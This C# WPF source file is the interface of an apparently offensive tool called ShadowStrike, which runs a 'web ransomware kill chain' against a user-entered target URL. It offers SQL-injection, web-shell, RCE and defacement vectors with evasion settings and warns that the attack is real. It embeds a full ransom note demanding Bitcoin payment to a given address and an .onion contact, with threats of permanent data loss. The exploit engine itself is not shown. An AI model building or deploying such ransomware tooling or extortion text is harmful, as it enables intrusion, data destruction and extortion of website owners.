using System;
using System.Windows;
using System.Windows.Controls;
using ShadowStrike.Core;
using ShadowStrike.UI;

namespace ShadowStrike.UI.Views
{
    public partial class RansomwareView : UserControl
    {
        private WebRansomwareEngine _engine;
        private bool _isAttacking;

        public RansomwareView()
        {
            try
            {
                InitializeComponent();
                _engine = new WebRansomwareEngine();
                _engine.LogEvent += OnLogReceived;
                _engine.PhaseCompleteEvent += OnPhaseComplete;
                
                // Update evasion level text when slider changes
                EvasionSlider.ValueChanged += (s, e) =>
                {
                    string[] levels = { "None", "Low", "Medium", "Maximum" };
                    EvasionLevelText.Text = levels[(int)EvasionSlider.Value];
                };
                


                // Auto-fill from AppState
                var appState = AppState.Load();
                if (!string.IsNullOrEmpty(appState.TargetUrl))
                {
                    TargetUrlBox.Text = appState.TargetUrl;
                }

                // Refresh target URL when view is loaded
                this.Loaded += (s, e) =>
                {
                    var state = AppState.Load();
                    if (!string.IsNullOrEmpty(state.TargetUrl))
                    {
                        TargetUrlBox.Text = state.TargetUrl;
                    }
                };
            }
            catch (Exception ex)
            {
                CustomMessageBox.Show($"Error loading Ransomware View: {ex.Message}\n\nStack Trace:\n{ex.StackTrace}", 
                    "Ransomware View Error", MessageBoxButton.OK, MessageBoxImage.Error);
                throw;
            }
        }



        private async void ExecuteButton_Click(object sender, RoutedEventArgs e)
        {
            if (_isAttacking) return;

            var state = AppState.Load();
            if (!state.IsScanCompleted)
            {
                CustomMessageBox.Show("Please scan a target in the Dashboard first to identify vulnerabilities and open ports.", "Scan Required", MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }
            
            string targetUrl = TargetUrlBox.Text.Trim();
            if (string.IsNullOrEmpty(targetUrl))
            {
                CustomMessageBox.Show("Please enter a target URL.", "No Target", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            
            if (!targetUrl.StartsWith("http://") && !targetUrl.StartsWith("https://"))
            {
                targetUrl = "https://" + targetUrl;
                TargetUrlBox.Text = targetUrl;
            }
            
            int attackVector = AttackVectorComboBox.SelectedIndex;
            int evasionLevel = (int)EvasionSlider.Value;

            string ransomNote = @"╔═══════════════════════════════════════════════════════════════╗
║           YOUR WEBSITE HAS BEEN ENCRYPTED                     ║
║                  BY SHADOWSTRIKE                              ║
╚═══════════════════════════════════════════════════════════════╝

All your website files and databases have been encrypted using 
military-grade AES-256 encryption.

To recover your data, you must obtain the decryption key from us.

PAYMENT INSTRUCTIONS:
1. Purchase 0.5 BTC worth of Bitcoin
2. Send to: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
3. Email your unique ID to: recovery@shadowstrike-decrypt.onion

Your Unique ID: {VICTIM_ID}

WARNING: Do not attempt to restore from backups or use third-party
decryption tools. This will result in permanent data loss.

You have 72 hours to comply.";
            
            string vectorName = attackVector switch
            {
                0 => "SQL Injection → Database Encryption",
                1 => "File Upload → Web Shell",
                2 => "RCE → Server Encryption",
                3 => "Defacement → Ransom Page",
                4 => "All Vectors (Full Kill Chain)",
                _ => "Unknown"
            };
            
            string message = $"Initiating Web Ransomware Attack\n\n" +
                           $"Target: {targetUrl}\n" +
                           $"Attack Vector: {vectorName}\n" +
                           $"Evasion Level: {evasionLevel}/3\n" +
                           $"Max Delay: {DelaySlider.Value}s\n\n" +
                           $"This will perform a REAL attack. Proceed?";
            
            var result = CustomMessageBox.Show(message, "Confirm Attack", MessageBoxButton.YesNo, MessageBoxImage.Warning);
            
            if (result)
            {
                _isAttacking = true;
                ExecuteButton.IsEnabled = false;
                StopButton.IsEnabled = true;
                StatusText.Text = "ATTACKING";
                StatusText.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(255, 68, 68));
                
                LogOutput.Clear();
                LogOutput.AppendText($"╔═══════════════════════════════════════════════════════════════╗\n");
                LogOutput.AppendText($"║  SHADOWSTRIKE WEB RANSOMWARE KILL CHAIN                       ║\n");
                LogOutput.AppendText($"╚═══════════════════════════════════════════════════════════════╝\n\n");
                
                try
                {
                    CurrentVectorText.Text = "Executing Kill Chain...";
                    await _engine.ExecuteAttackAsync(targetUrl, ransomNote);
                    
                    StatusText.Text = "COMPLETED";
                    StatusText.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0, 255, 136));
                    CurrentVectorText.Text = "Attack Finished";
                }
                catch (Exception ex)
                {
                    LogOutput.AppendText($"\n[ERROR] {ex.Message}\n");
                    StatusText.Text = "FAILED";
                    StatusText.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(255, 68, 68));
                }
                finally
                {
                    _isAttacking = false;
                    ExecuteButton.IsEnabled = true;
                    StopButton.IsEnabled = false;
                }
            }
        }

        private void StopButton_Click(object sender, RoutedEventArgs e)
        {
            _isAttacking = false;
            StatusText.Text = "STOPPED";
            StatusText.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(255, 170, 0));
            ExecuteButton.IsEnabled = true;
            StopButton.IsEnabled = false;
            LogOutput.AppendText("\n[ATTACK STOPPED BY USER]\n");
        }

        private void OnLogReceived(object sender, string message)
        {
            Dispatcher.Invoke(() =>
            {
                LogOutput.AppendText(message + "\n");
                LogOutput.ScrollToEnd();
            });
        }

        private void OnPhaseComplete(object sender, (string phase, bool success) data)
        {
            Dispatcher.Invoke(() =>
            {
                string status = data.success ? "✓ SUCCESS" : "✗ FAILED";
                string color = data.success ? "#3FB950" : "#DA3633";
                
                CurrentVectorText.Text = $"{data.phase}: {status}";
                LogOutput.AppendText($"\n>>> {data.phase.ToUpper()}: {status}\n\n");
            });
        }
    }
}
